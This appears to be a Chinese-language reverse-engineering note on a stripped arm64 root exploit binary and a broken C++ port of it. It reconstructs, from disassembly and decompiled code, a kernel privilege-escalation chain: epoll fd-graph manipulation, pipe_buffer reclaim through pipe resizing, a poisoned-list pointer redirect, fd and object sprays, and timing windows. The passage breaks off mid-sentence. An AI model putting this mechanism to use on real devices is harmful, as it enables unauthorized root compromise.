# `fd_graph` 写入原语 scoping（2026-10-03，含指令级修正）

对比 `preload.so`（本机验证可 root）与 `src/core/route/fd_graph_route.cpp` 的实现。
配套门禁记录：`docs/analysis/device-gates/PROFILE-61258-01-20261003-fdgraph-fail.md`。

> **修正说明**：本文档初版仅基于字符串表推断，断言写入经由 `splice`/`vmsplice`。
> 指令级核对（见 §2）**推翻了该断言**。结论已按证据分级重写。

## 1. 结论

移植只搬走了**词汇表与几何常量**，没有搬**机制**。
stub 的写入路径是空实现：真机 10 次尝试 `chain_hits=0`，随后 kernel_panic。

关键纠正：**`preload.so` 的成功写入不经过 `splice`/`vmsplice`**。它是
**pipe_buffer 槽位回收（reclaim）+ 受控页写入（payload write）** 的竞态。

## 2. 证据分级

### 2.1 指令级已证事实（`llvm-objdump` 反汇编 + 交叉引用统计）

`preload.so` 是 stripped 静态 ELF（`nm` 符号数 0），`.text` = `0x21a780..0x25a854`。
所有 syscall 经 `0x2540xx..0x257xxx` 的 thunk 表（`bti c` / `mov x8,#N` / `svc #0` / SYSCHK 尾）。

**`vmsplice`(75) / `splice`(76) / `tee`(77) 的 thunk 存在，但永不被调用：**

| thunk | 入口 | `bl` 调用点 | 数据段指针引用 |
|---|---|---|---|
| `vmsplice` (75) | `0x257480` | **0** | **0** |
| `splice` (76) | `0x257440` | **0** | **0** |
| `tee` (77) | `0x257400` | **0** | **0** |
| 对照：`sched_setaffinity` (122) | `0x256fc0` | 4 | 0 |
| 对照：`mmap` (222) | `0x255e40` | 27 | 0 |

对照组证明直接 `bl` 调用是本二进制的常态（`0x257b9c` 被调 46 次、`0x257c58` 45 次），
且这些地址也**不以函数指针形式出现在数据段**（排除间接调度）。
故这三个 syscall 是**死代码**，字符串 `vmsplice index=%zu advance=%zd expected=%zu`
与 `target splice index=%zu: %m` 中的 “vmsplice/splice” 是**日志标签（索引编号），
不是 syscall 调用**。

> 附带纠正：arm64 上 `vmsplice`=75、`splice`=76（取自 NDK `asm-generic/unistd.h`）。
> 269/275 是 `sendmmsg`/`sched_getattr`，不可凭 `0x10d`/`0x113` 的十六进制字面值推断。

### 2.2 日志级已证事实（`preload-full-log.txt`，同机同 kernel 的 PASS 运行）

两种成功模式，各有独立 `RESULT PASS`：

```
RESULT PASS pipe_flags_candidate page=0x%016llx fake_count=%d generation=0x%016llx
    reclaim_hits=%d chain_hits=%d bit4_hits=%d
RESULT PASS zero_byte_redirect target=0x%016llx generation=0x%016llx
    reclaim_hits=%d chain_hits=%d carrier_readback=%d
```

回收命中同样分两模式：

```
RECLAIM_HIT mode=pipe round=%d delay_us=%u generation=0x%016llx outer_depth=%u can_merge=%u duration_ns=%llu
RECLAIM_HIT mode=zero round=%d delay_us=%u generation=0x%016llx outer_depth=%u zero_target=0x%016llx duration_ns=%llu
```

**时序扫描是必要步骤**（第一轮 PASS 运行）：

| delay_us | 0 | 1 | **2** | 4 | 8 | 12 | 20 | 32 | 48 | 64 |
|---|---|---|---|---|---|---|---|---|---|---|
| chain_hits | 0 | 1 | **1** | 0 | 0 | 0 | 0 | 0 | 0 | 0 |
| bit4_hits | 0 | 0 | **1** | 0 | 0 | 0 | 0 | 0 | 0 | 0 |

第二轮 PASS 则在 `delay_us=0` 命中。**结论：命中率依赖精确时序。**
注意：stub 的 `delays[]`（`fd_graph_route.cpp:248`）**已覆盖同一序列**，
因此「扫描时序」本身不是缺口 —— 缺口是时序扫描所围绕的回收/重定向机制不存在（见 §4）。
时序是必要非充分条件。

阶段序列（`stage=` / `event=` 去重后，权威流程）：

```
target → environment → carrier_preflight → carrier_patch → patch
  → pipe_worker_start / pipe_worker{start,file_slots_ready,payload_writes,resize_sample,phase}
  → known_page_prepare → known_page{config,kernelsnitch_setup,mte_mode,skb_geometry,
      collision_result,reclaim_begin,reclaim_end,send_order,release}
  → known_page_acquired{resources}
  → late_refs_before_known_page → late_refs{affinity,cpu_pin,decoy_unlink,fd_preflight,static_layout}
  → patch{attempt_plan,known_page,marker,worker_spawn}
  → redirect{spawn,complete} → selinux_zero{begin,attempt} → root_proof{matrix}
```

### 2.3 机制推断（已由 §2.4 / §2.5 大部分落实）

原始推断：回收 `pipe_buffer` 槽位 → 使其指向**受控页**（`preset_direct_map`）→
worker 线程向该槽写入（`payload_writes`）→ 写入落到 `controlled_page`。

§2.5 修正了两点：

1. 写入目标是 **`fd_table[4]`（普通 fd）**，不是内核地址；受控页是经该 fd 背后的
   被回收 `pipe_buffer` 槽位间接到达的。
2. 触发写入的是**命令字驱动**（worker `read` 1 字节，`== 'W'` 才写），
   而非无条件写。

仍属推断的部分：`pipe_buffer` 槽位如何被回收并重占为受控对象，
以及 `EPOLL_CTL_DEL` 在其中扮演的确切角色。

### 2.4 指令级：写入函数的 syscall 清单（批次 C 结论）

`file_slots_ready` / `KNOWN_PAGE` / `PROBE_TARGET` / `decoy_unlink` /
`count=...vmsplice_pages` 五个阶段格式串的 `add` 交叉引用**全部落在同一函数**
`0x2205a8`（8356 字节）—— 即整个竞态编排是**单个大函数**。

该函数内的直接 syscall thunk 调用清单：

| syscall | 次数 | 推断作用 |
|---|---|---|
| `epoll_ctl` (21) | **7** | 构造/改写 epitem 图（`fd_graph` 之名由此而来） |
| `read` (63) | 2 | 探针与独立读回 |
| `write` (64) | **1** | **payload 投递**（对应 `payload_writes`） |
| `splice` (76) / `vmsplice` (75) / `tee` (77) | **0** | 死代码，确认 §2.1 |

因此：
1. **`splice`/`vmsplice`/`tee` 确认未被使用**（独立于 §2.1 的 thunk 统计，
   此处是调用点级别的证据）。
2. **写入经由单次 `write`**（arm64 `__NR_write`=64，取自 NDK `asm-generic/unistd.h`），
   与 `pipe_worker` 的 `payload_writes` 一致。
3. **原语是 epoll fd 图**：7 次 `epoll_ctl` 对应 CVE-2026-43499 的
   `epitem.fllink` 链操纵，与 profile 的 `epitem_ep=0x48`/`epitem_fllink=0x50` 吻合。

> **参数级已确认**（见 §2.5）：7 次 `epoll_ctl` = 6×`EPOLL_CTL_ADD` + 1×`EPOLL_CTL_DEL`；
> payload 由**单次 `write(fd_table[4], …)`** 投递，fd 来自被追踪的 fd 表。

### 2.5 指令级：参数序列（批次 C 续做结论）

### 2.5.1 7 次 `epoll_ctl` —— 建图 + 摘链

| 地址 | `op`(x1) | `fd`(x2) | `event`(x3) | 判读 |
|---|---|---|---|---|
| `0x22167c` | `1` ADD | `w19` | `sp+0x300` | 加入第 1 个 epoll 实例 |
| `0x2216c8` | `1` ADD | `w22` | `sp+0x300` | 加入第 2 个 |
| `0x221988` | `1` ADD | `w28` | `x29-0x30` | 加入第 3 个 |
| `0x2219b4` | `1` ADD | `w28` | `x29-0x30` | 加入第 4 个 |
| `0x2219dc` | `1` ADD | `w27` | `x29-0x30` | 加入第 5 个（`epfd=array[x23[i]]` 循环） |
| `0x221acc` | **`2` DEL** | `w28` | **`xzr`(NULL)** | **摘链** —— 即 `decoy_unlink` |
| `0x222600` | `1` ADD | `w19`/`w2` | `sp` | 收尾补入 |

- `epfd` 取自 `ldr w0,[x23, x22, lsl #2]`（`0x2219c4`）：**同一个目标 fd 被注册进多个
  epoll 实例**，从而在 `epitem.fllink` 上拉出宽图 —— 这就是「fd graph」与
  CVE-2026-43499 原语。
- `EPOLL_CTL_DEL` 传 `event=NULL` 是合法用法（等价 `EPOLL_CTL_MOD` 的删除语义），
  对应解绑等待者。
- `mov w0, #0x80000`（`0x80000` = `EPOLL_CLOEXEC`）后 `bl 0x23c754` → `epoll_create1`。

### 2.5.2 payload 写入是「命令驱动」的

```
0x220b78: add  x1, sp, #0x64      ; buf
0x220b7c: mov  w0, w19            ; fd
0x220b80: mov  w2, #0x1           ; count = 1
0x220b84: bl   read               ; read(fd, &sp[0x64], 1)
0x220ba8: ldrb w8, [sp, #0x64]
0x220bac: cmp  w8, #0x57          ; 0x57 = 'W'   ← 命令字
0x220bb0: b.ne <skip>
0x220bbc: ldr  x8, [x20, #0x3a8]  ; fd 表基址
0x220bb8: mov  w19, #0x4          ; slot = 4
0x220bc8: ldr  w0, [x8, x19]      ; fd = fd_table[4]
0x220bcc: bl   write              ; write(fd_table[4], buf, count)
```

- worker 先 `read` **1 字节命令**，仅当该字节 `== 'W'(0x57)` 才执行写入。
- 写入目标是 `fd_table[4]`（`w19=4`），即日志串
  `count=%zu vmsplice_pages=%d file_slot=%d target_offset=%lld fds=%d` 中的 **`file_slot=4`**。
- **写入目标是普通 fd，不是内核地址。** 这从参数层面彻底否证了 stub 的
  「内核地址当 fd」写法。

### 2.5.3 时序等待

`0x221aa0`–`0x221ab8` 为自旋等待：`ldp x8,x9,[x29,-0x30]` → `madd x8,x8,x24,x9`
→ `cmp x8,x22` → `yield` → 回跳。即按计算出的时间窗自旋，构成 `delay_us` 扫描的
等待点（与 §2.2 的 `delay_us` 命中档位对应）。

### 2.5.4 编排函数的完整 syscall 清单（参数级，arm64 号取自 NDK 头）

| syscall | 次数 | 判读 |
|---|---|---|
| `getrlimit`(163) / `setrlimit`(164) | 6 / 4 | **抬 `RLIMIT_NOFILE`**，为建图取得 fd 额度 |
| `epoll_ctl`(21) | 7 | 图的最终结构（§2.5.1） |
| `read`(63) / `write`(64) | 2 / 1 | 命令字 + payload（§2.5.2） |
| `pread64`(67) | 1 | 定位读 |
| `sched_setaffinity`(122) | 4 | CPU 绑核（对应 `late_refs{cpu_pin,affinity}`） |
| `setsockopt`(208) / `getsockopt`(209) | 1 / 3 | skb 几何（`skb_geometry`、`mcast_sources=14`） |
| `munmap`(215) / `mmap`(222) | 1 / 1 | 缓冲映射 |
| `setpgid`(154) / `kill`(129) | 1 / 1 | 线程组管理 |

**关键推论：fd 数量级远大于 7。** `preload.so` 自身日志报
`phase=collision_shape fds=1964`、`fds=1005`，即进程内 fd 达千级；
配合 `getrlimit`/`setrlimit` 各 4–6 次，说明「fd graph」是**先扩额度、批量开 fd、
再注册进 epoll** 形成的宽图，§2.5.1 的 7 次 `epoll_ctl` 是收尾的结构操作，
而非全部注册量。

`collision_shape pre=24 post=25` 度量的是**碰撞计数**恰好 +1，与 fd 总数是不同量。

### 2.5.5 仍未确认（批次 D 的剩余前置）

1. ~~**`pipe_buffer` 槽位的回收与重占机制**~~ → **回收手段已确认**（§2.7：
   `F_SETPIPE_SZ` 8K/128K 两级缩放 + `F_GETPIPE_SZ` 回读，失败即 `exit(-1)`），
   **`fake_fllink` 构造已确认**（§2.8：`base | 0x108` = `LIST_POISON1 + 8`），
   **投递链已确认**（§2.9：240 路 `write` 喷洒 + `pread64` 回读；
   §2.10：240 根管道由 fd 表 `malloc(0x780)` 建立，空槽初值 `-1`），
   **`fake_count` 含义已确定**（§2.11：`0x10` = 16，即受控对象喷洒个数，
   **不是**此前猜测的「计数/引用计数」；同时 profile 的
   `objects_per_order3` / `pipe_object` / `pipe_flags` 三项由成功样本直接印证）。
   剩余未确认：`EPOLL_CTL_DEL` 在其中的确切角色、`+8` 偏移量的选取依据，
   受控对象内 `+0x1780` / `+0x1788` 两处写入对应的具体字段，
   以及槽位被重占后的完整布局。
2. **`gen`/`refs`/`depth`/`refcount` 在 6.12.58 上的真值**：
   `preload.so` 串中的 `0xa8/0xb0/0xb8/0xbc` 是通用值，
   需 BTF 或真机读回交叉验证（批次 B 的前置）。
3. **bit4 的含义已确认为 `PIPE_BUF_FLAG_CAN_MERGE`**（见 §2.6），
   但**其在 `pipe_buffer.flags` 上的写入点仍未定位**，
   且**不要用「向 `[x?,#0x18]` 存值」来搜**：本次已验证该模式在本二进制中
   大量误命中——`0x224b40`–`0x224c38` 的七个 `str w?, [x27, #0x18]` 属于
   **HOCON/JSON 解析器的游标**（`ldrsw x8,[x27,#0x18]` → `add #8` → `str`，
   伴随对 `'l'/'h'/'o'/'c'/'m'/'p'/'s'/'u'/'d'/'i'/'%'` 的 ASCII 比较），
   与 `pipe_buffer` 无关。第二个候选 `0x2225b4: str w0, [x19, #0x18]`
   亦**证伪**：其 `w0` 是 `bl 0x23ac20` 的**返回值**而非 `0x10` 字面量，
   且紧邻的 `stlr [x19,#0x8]` / `ldar [x19,#0xc]` + `yield` 自旋是
   **生产者/消费者握手**，不是标志位写入。
   定位必须带类型上下文（从 `pipe_buffer` 基址 + 槽位索引做数据流，
   并确认被写值的定义来源），仅凭偏移字面量不可行。
   第三个已排除的候选：`annotated.c` 中 4 处 `uVar | 0x10`
   （`FUN_00234a28` 等）经查是 **mmap 包装函数**，
   `0x22 | 0x10` 即 `MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED`，
   底层调用 `FUN_00255e40(..., prot, flags, -1, 0)`，与 `CAN_MERGE` 无关。
   **本项在 stripped 二进制上已接近静态分析上限**，建议改为批次 D
   实现期间用实测/打点确认，不再继续静态追。

### 2.6 内核源码交叉验证（v6.12 GKI 公开源码）

设备为 production build（`ro.build.type=user`、`ro.secure=1`），`adb root` 不可用，
`/sys/kernel/btf/vmlinux` 拒绝读取；工作区亦无 `boot.img`/`vmlinux`/BTF。
故退而用公开 GKI 源码交叉验证，**只采信能被设备已确认值印证的结论**。

#### 2.6.1 已证实：`bit4` = `PIPE_BUF_FLAG_CAN_MERGE`（`include/linux/pipe_fs_i.h`）

```c
#define PIPE_BUF_FLAG_LRU      0x01
#define PIPE_BUF_FLAG_ATOMIC   0x02
#define PIPE_BUF_FLAG_GIFT     0x04
#define PIPE_BUF_FLAG_PACKET   0x08
#define PIPE_BUF_FLAG_CAN_MERGE 0x10   /* can merge buffers */
#define PIPE_BUF_FLAG_WHOLE    0x20
```

**bit4 就是 `CAN_MERGE`**，是合法标志位，不是伪造的非法值。
它的机制意义：置位后 `pipe_buf_merge()` 可**不拷贝**而直接串接页，
这正是把受控页挂进管环的机制前提 —— 与日志
`RECLAIM_HIT mode=pipe ... can_merge=%u` 字段名一致。

#### 2.6.2 已证实：`pipe_buffer` 布局与 profile 完全一致

```c
struct pipe_buffer {
	struct page *page;                          /* 0x00 */
	unsigned int offset, len;                   /* 0x08, 0x0c */
	const struct pipe_buf_operations *ops;      /* 0x10 */
	unsigned int flags;                         /* 0x18 */
	unsigned long private;                      /* 0x20 */
};                                             /* sizeof = 0x28 */
```

| 项 | v6.12 源码 | profile | 真机日志 |
|---|---|---|---|
| `flags` 偏移 | `0x18` | `pipe_flags=0x18` | 一致 |
| `sizeof` | `0x28` | `pipe_buffer=0x28` | 一致 |

这是本节唯一被设备已确认值**双向印证**的结构，故其余推断均以此为限。

#### 2.6.3 未能证实：`gen`/`refs`/`depth`/`refcount`

`torvalds/linux` `fs/eventpoll.c` 的 `struct eventpoll` 字段顺序为
`u64 gen` → `struct hlist_head refs` → `u8 loop_check_depth` → `refcount_t refcount`。
但按 arm64 对齐推算**与 `preload.so` 串不自洽**：`refs`(16 字节) 若在 `0xb0`
则占到 `0xc0`，与串中的 `depth=0xb8`、`refcount=0xbc` 冲突。

结论：**main 分支源码不能替代 6.12.58 的真实布局**（字段增删会移动偏移）。
这 4 个偏移必须来自 6.12.58 的 BTF 或真机读回，批次 B 在拿到之前不得填值。

### 2.7 指令级：回收手段 = `F_SETPIPE_SZ` 缩放管环（批次 C 收尾）

在编排函数内（`0x220fa4`–`0x220fec`）定位到管环重设并**回读校验**：

```
220fa4: lsl  w22, w19, #12      ; 页数 → 字节（PAGE_SHIFT=12）
220fac: bl   0x225e8c           ; 取锁
220fb8: mov  w1, #0x407         ; 1031 = F_SETPIPE_SZ
220fbc: ldr  w0, [x24]          ; fd = *arg0
220fc0: mov  w2, w22            ; 字节数
220fc4: bl   0x228168           ; fcntl 包装
220fd0: mov  w1, #0x408         ; 1032 = F_GETPIPE_SZ
220fe0: bl   0x228168           ; fcntl 包装
220fe4: tbnz w24, #0x1f         ; SETPIPE_SZ 返回值错误检查
220fe8: cmp  w0, w22            ; GETPIPE_SZ == 请求值？
220fec: b.ne 0x221054           ; 不符则失败退出
```

这正是日志事件 `resize_sample`。

**常量核对**（NDK `asm-generic/fcntl.h`）：`F_LINUX_SPECIFIC_BASE = 1024`，
`F_SETPIPE_SZ = 1024+7 = 1031 = 0x407`，`F_GETPIPE_SZ = 1032 = 0x408` —— 与指令一致。

**两个过程中纠正的自身错误**（记录以免重犯）：

1. 最初只 grep `cmp w?, #0x407` 得到 0 命中，据此**错误地**断定 `F_SETPIPE_SZ`
   未被使用。实际形式是 `mov w1, #0x407`（把 cmd 装入 w1 后再调包装函数），
   不是 `cmp` 立即数。**结论被推翻。**
2. 唯一的 `fcntl` thunk 调用点 `0x228228` 处 `cmp w19, #0x406`
   ——`0x406 = 1030 = F_GETOWN`，属于通用 fd 管理包装（另有 `#0x2 = F_SETFD`、
   `w19==0 = F_GETFD` 分支），**与管环无关**。

**机制判读（推断，非指令级）**：`F_SETPIPE_SZ` 下探到 `pipe_resize_ring()`，
缩容时会 `realloc`/释放旧的 `pipe->bufs` 数组 —— 旧管环数组被释放即产生
`pipe_buffer` 槽位的 UAF 窗口，随后该内存被重占为受控对象。
这解释了为何必须做 `GETPIPE_SZ` 回读：**缩放未生效则整条回收路径作废**，
故它是必要条件而非可选的确认动作。

#### 2.7.1 反编译 C 证实：`worker_pool` 的完整语义（`decompiled/annotated.c:4826`–`4866`）

工作区存在 `preload.so` 的 **Ghidra 反编译产物**
（`../decompiled/annotated.c`，`pd2502_mt6993_full_2f55ad9c.so`，1051 个函数全恢复，
镜像基址 `0x200000`、入口 `0x21a780`，与本节反汇编同一二进制）。
该函数可读形式为：

```c
/* >>> SUGGESTED NAME: worker_pool   [rule] */
void FUN_00220f7c(undefined4 *param_1, undefined8 param_2, ...) {
  iVar2 = (int)param_2 * 0x1000;                      /* slots << 12 → 字节 */
  puVar5 = FUN_00225e8c(); *puVar5 = 0;
  iVar3 = FUN_00228168(*param_1, 0x407, iVar2);        /* fcntl(fd, F_SETPIPE_SZ, bytes) */
  uVar1 = *puVar5;  *puVar5 = 0;
  iVar4 = FUN_00228168(*param_1, 0x408);              /* fcntl(fd, F_GETPIPE_SZ) */
  if ((-1 < iVar3) && (iVar4 == iVar2)) {              /* 成功：无错 且 观测值==请求值 */
    if (param_4 != 0) { return; }
    FUN_0021d2f8("pipe_worker","resize_sample",
                 "phase=%s index=0 slots=%zu set_result=%d observed=%d", ...);
    return;
  }
  FUN_0021d2f8("pipe_worker","resize_fail", ...);      /* 失败：先记日志 */
  *puVar5 = uVar1;
  FUN_0024094c(...);                                   /* WARNING: 不返回 */
  FUN_00227e40(0xffffffff);                            /* exit(-1) */
}
```

比反汇编多出的三点关键语义：

1. **成功判据是「无错 **且** `observed == requested`」**，不是「无错」。
   仅 `F_SETPIPE_SZ` 返回成功不足以继续。
2. **失败是致命的**：记 `resize_fail` 后直接 `exit(-1)`，**不重试、不降级**。
   因此批次 D 必须在投递前处理缩放失败，不能在失败后重入。
3. **该函数属 `pipe_worker` 阶段**（日志 tag `"pipe_worker"`），而非我先前
   按地址推断的「编排函数内」。`resize_sample` 事件由此定位到 worker 侧。

> **反编译产物已可用**：批次 D 取证不必再依赖裸反汇编 ——
> `../decompiled/annotated.c` 提供带函数边界与 Ghidra 建议名的可读 C。
> 注意其数值渲染约定：**裸数为十进制**（`= 10;` 即 0xa），
> `0x` 前缀才是十六进制。误按十六进制读会把 `10` 当成 `CAN_MERGE`(0x10)。
>
> **Ghidra 建议名不可尽信**：名为 `reclaim_race` 的 `FUN_0022264c`（`annotated.c:5847`）
> 实际**只负责打印** `RACE_SUMMARY` —— 它接收 10 组已算好的统计数组，
> 逐档输出，不做任何竞态。真正的竞态在编排函数内（§2.4/§2.5）。
> 该函数同时以立即数形式硬编码了 delay 阶梯
> `{0, 1, 2, 4, 8, 0xc, 0x14, 0x20, 0x30, 0x40}`，
> 与 stub 的 `delays[]`（`fd_graph_route.cpp:248`）**逐项一致**。

### 2.8 指令级：`fake_fllink` 的构造（`LIST_POISON1 + 8`）

`KNOWN_PAGE` 日志点（`0x221560`–`0x221574`）前一行即构造：

```
22155c: mov  w8, #0x108        ; 264
221560: adrp x0, 0x206000
221564: add  x0, x0, #0x26f    ; "KNOWN_PAGE base=0x%016llx fake_fllink=0x%016llx"
221568: orr  x2, x19, x8       ; fake_fllink = base | 0x108
22156c: mov  x1, x19           ; base
221570: str  x2, [sp, #0x138]
221574: bl   <log>
```

**常量核对**（v6.12 `include/linux/poison.h`）：

```c
#define POISON_POINTER_DELTA 0            /* arm64 无 CONFIG_ILLEGAL_POINTER_VALUE */
#define LIST_POISON1  ((void *) 0x100 + POISON_POINTER_DELTA)   /* = 0x100 */
#define LIST_POISON2  ((void *) 0x122 + POISON_POINTER_DELTA)   /* = 0x122 */
```

配合 `include/linux/list.h`：`list_del()` 写 `entry->next = LIST_POISON1`，
`hlist_del()` 写 `n->next = LIST_POISON1`。故：

**`fake_fllink = base | 0x108 = LIST_POISON1 + 8`**

`base` 为页对齐，故 `|` 与 `+` 等价。这是标准的**链表中毒重定向**手法：
被删除的 `epitem` 的 `fllink.next` 被写成毒值，当内核随后遍历该链并对其做
`list_entry(next, struct epitem, fllink)` 反推时，减去的
`offsetof(epitem, fllink)`（profile `epitem_fllink = 0x50`）会把落点偏移到
攻击者选定处。

> **推断部分**：`+8` 的具体选取取决于 `base` 的含义与内核后续对该值做的运算，
> 尚未取得指令级确认；已确认的只是「毒值基址 + 8」这一形式。

紧邻其前的循环（`0x221508`–`0x221538`）以 `0x800`（= profile `pipe_object`）
为步长向 `[…, #0x1780]` / `[…, #0x1788]` 写两列，疑为受控对象数组的铺设
（步长与 profile 的 `pipe_object=2048`、`objects_per_order3=16` 相符），
但寄存器归属未逐一回溯，故仅作线索记录。

### 2.9 指令级+反编译：payload 投递 = 240 路 fd 喷洒（批次 D 最关键一条）

`pipe_flags_candidate`（`FUN_00220614`，`annotated.c:4477`–`4825`）的投递段：

```c
if (local_ec[0] != 'W') { return (bool)2; }        /* 命令字门控 */
lVar6 = 4; uVar14 = 0;
do {
  uVar9 = FUN_00254f00(*(undefined4 *)(DAT_002683a8 + lVar6), param_3, param_4);
  if (uVar9 != param_4) { ...错误... }
  uVar9 = uVar14 + 1;
  bVar1 = uVar14 < 0xef;                          /* 0xef = 239 → 共 240 次 */
  lVar6 = lVar6 + 8;
  uVar14 = uVar9;
} while (bVar1);
FUN_0021d2f8("pipe_worker","payload_writes","ok=%zu total=%zu payload=%zu",
             uVar9, 0xf0, param_4);
puVar11 = FUN_0025a670(param_4);                   /* malloc(payload_len) */
if ((puVar11 != 0) &&
    (uVar14 = FUN_00254f40(iVar2, puVar11, param_4, param_2), uVar14 == param_4)) {
  iVar4 = FUN_00257e30(puVar11, param_3, param_4);
  FUN_0024094c("PIPE_OBSERVED expected=");         /* 观测长度，日志截到 0x40 */
  ...
```

**syscall 归属（反汇编逐一核对，非猜测）**：

| 被调函数 | 地址 | `mov x8` | syscall |
|---|---|---|---|
| `FUN_00254f00` | `0x254f00` | `#0x40` (64) | **`write`** |
| `FUN_00254ec0` | `0x254ec0` | `#0x3f` (63) | `read` |
| `FUN_00254f40` | `0x254f40` | `#0x43` (67) | **`pread64`** |
| `FUN_00257e30` | `0x257e30` | 无直接 `mov x8` | 包装函数（非裸 thunk） |

因此投递链为：**命令字 `'W'` 门控 → 向 fd 表喷洒 240 次 `write` →
`pread64` 回读 → `PIPE_OBSERVED` 观测**。要点：

1. **fd 表在 `DAT_002683a8`，步长 8、基址 `+4`** —— 即每项 8 字节里取低 4 字节作 fd。
2. **每次 `write` 必须返回完整长度**（`!= param_4` 即走错误），否则整轮放弃。
3. 回读用 `pread64`（带偏移），非 `read`，说明**按槽位偏移**校验而非顺序读。

### 2.9.1 stub 的 `0xf0` 循环就是这个喷洒的残骸

`fd_graph_route.cpp:183`/`190`/`222`/`228`：

```cpp
for (uint32_t i = 0; i < 0xf0; i++) { reclaim_slots[i] = 0; }   /* 0xf0 = 240 */
pr_info("fd_graph: reclaim_small complete fds=%u\n", 0xf0);
```

`0xf0 = 240`、`total=%zu` 的实参 `0xf0`、以及 `fds=` 这一日志标签
**都源自真实实现的 240 路 fd 喷洒**。stub 保留了循环次数与日志标签，
却把 `write(fd_table[i], payload, len)` 换成了对用户态缓冲的 `memset` ——
这正是 §4 差距表里「写入」一行的根因。

另注：该函数内的 `FUN_00255e40(0,0xa000,3,0x22,-1,0)` 即
`mmap(0, 0xa000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)`，
与 stub `expand_region` 的 `map_anonymous(0xa000, ...)` 尺寸一致 ——
stub 的常量同样来自本函数，只是丢了语义。

### 2.10 fd 表与 240 根管道的建立（投递链的最后一环）

`pipe_flags_candidate` 起始段（`annotated.c:4583`–`4612`）：

```c
FUN_002580f4(lVar6, 0x42, 0x10000);          /* memset(payload_buf, 'B', 64K) */
DAT_002683b0 = FUN_0025a670(0x780);          /* malloc(0x780) → drain 表   */
DAT_002683a8 = FUN_0025a670(0x780);          /* malloc(0x780) → reclaim 表 */
FUN_002580f4(lVar6, 0xff, 0x780);            /* 两表均 memset 0xff        */
do {
  iVar2 = FUN_00235e44(DAT_002683a8 + lVar6);   /* 建管道并把 fd 写进该槽 */
  if (iVar2 != 0) { ...错误退出... }
  FUN_00220f7c(DAT_002683a8 + lVar6, 2, "reclaim_small", uVar14);
  bVar1 = uVar14 < 0xef;  lVar6 += 8;                     /* 240 槽，步长 8 */
} while (bVar1);
FUN_0021d2f8("pipe_worker","phase","name=reclaim_small complete=%zu fds=%d", 0xf0, uVar3);
/* 之后 reclaim_expand：FUN_00220f7c(&table[i], 0x20, "reclaim_expand", i) */
```

要点：

1. **表是用户态数组**：`0x780 = 1920 = 240 × 8`。`memset 0xff` 使每槽初值
   `0xffffffffffffffff`，即 **fd = -1（空槽标记）**，而不是 0。
2. **每槽一根管道**：`FUN_00235e44(&table[i])` 建管道并把 fd 写回槽位。
   故「240」既是槽数也是**管道根数**。
3. **两级缩放**：`reclaim_small` 用 `param_2=2` → `2 × 0x1000 = 8 KiB`；
   `reclaim_expand` 用 `0x20` → `32 × 0x1000 = 128 KiB`。
4. 顶部日志常量与 profile **逐项一致**：
   `pipe_slots=0x20(32)`、`pipe_buffer=0x28(40)`、`ring_request=0x500(1280)`。

#### 2.10.1 stub 的 `0x780`/`0xff` 是忠实移植，但丢了全部语义

`fd_graph_route.cpp:170`–`193`：

```cpp
reclaim_region = MappedRegion::map_anonymous(0x780, PROT_READ|PROT_WRITE);
memset(reclaim_region->data(), 0xff, 0x780);
for (uint32_t i = 0; i < 0xf0; i++) { reclaim_slots[i] = 0; }   /* ← 应为 fd */
```

尺寸（`0x780`）、填充值（`0xff`）、循环次数（`0xf0`）、表名（reclaim/drain）、
阶段名（`reclaim_small` / `reclaim_expand`）**全部移植正确**。
丢失的是四件事：

| 项 | 原实现 | stub |
|---|---|---|
| 分配方式 | `malloc` | `mmap`（等价可用，非缺陷） |
| 槽初值 | `0xff…ff`（fd = -1，空槽） | `0`（fd = 0，**语义相反**） |
| 建 240 根管道 | `FUN_00235e44(&table[i])` | **无** |
| 缩放管环 | `F_SETPIPE_SZ` 8K/128K + 回读 | **无** |

> 槽初值这一项需特别注意：stub 把空槽写成 `fd = 0`（stdin），
> 而原实现用 `-1` 作「未填充」标记。若批次 D 复用此表，**必须沿用 `-1` 语义**，
> 否则会把 fd 0 当成有效管道。

**证据分级**：`fcntl`(25) 已由指令核对（`0x2555c0: mov x8, #0x19`，经
`FUN_00228168` 包装，§2.7）。`malloc` / `memset` / 建管道三者
（`0x25a670` / `0x2580f4` / `0x235e44`）**无裸 `mov x8`**，属 libc 级包装，
其角色由调用形态推断（尺寸/填充值/槽指针），非指令级确证。

### 2.11 受控对象喷洒与 `PIPE_TARGET`（profile 常量由此确认）

`annotated.c:4900` 起的函数里，喷洒循环与随后的日志为：

```c
lVar32 = param_2 + 0x100;
lVar27 = -0x800;
do {
  lVar3 = 0;
  if (lVar27 != -0x80) { lVar3 = uVar30 + lVar27 + 0x988; }
  lVar20 = FUN_0022058c();
  *(long *)(lVar20 + lVar27 + 0x1780) = lVar32;      /* 高项 */
  lVar20 = FUN_0022058c();
  lVar32 = lVar32 + 0x800;                            /* 步长 = object_size */
  lVar20 = lVar20 + lVar27;
  lVar27 = lVar27 + 0x80;                             /* −0x800 → 0，步长 0x80 */
  *(long *)(lVar20 + 0x1788) = lVar3;                 /* 低项 */
} while (lVar27 != 0);
FUN_0024094c(
    "PIPE_TARGET page=0x%016llx fake_count=%d object_size=0x%x slot=%d flags_off=0x%x\n"
    , param_2, 0x10, 0x800, 10, 0x18);
```

**渲染约定复核**：`0x` 前缀为十六进制、裸数为十进制（§2.7.1 已记）。
故上式实参为：`fake_count = 0x10 = 16`、`object_size = 0x800 = 2048`、
`slot = 10`（十进制）、`flags_off = 0x18 = 24`。

**这是 §2.8 中「疑为受控对象数组铺设、仅作线索记录」那条线索的确认**：

| 量 | 指令级/反编译所得 | profile | 结论 |
|---|---|---|---|
| 喷洒个数 | `lVar27: −0x800 → 0`，步长 `0x80` ⇒ **16 次** | `objects_per_order3 = 16` | **一致** |
| 对象步长 | `lVar32 += 0x800` ⇒ **2048** | `pipe_object = 2048` | **一致** |
| 标志偏移 | 日志实参 `flags_off = 0x18` ⇒ **24** | `pipe_flags = 24` | **一致** |
| 活跃槽 | 日志实参 `slot = 10`（十进制） | 无对应字段 | 新增信息 |
| `fake_count` | **`0x10` = 16**，与喷洒个数相同 | `objects_per_order3 = 16` | `fake_count` 即受控对象数 |

要点：

1. **`fake_count` 的含义已确定**：它就是**喷洒的受控对象数量**（16），
   不是 §2.5.5 曾猜测的「计数/引用计数」。此处更正该猜测。
2. **profile 的三个常量由成功样本直接印证**
   （`objects_per_order3` / `pipe_object` / `pipe_flags`），说明
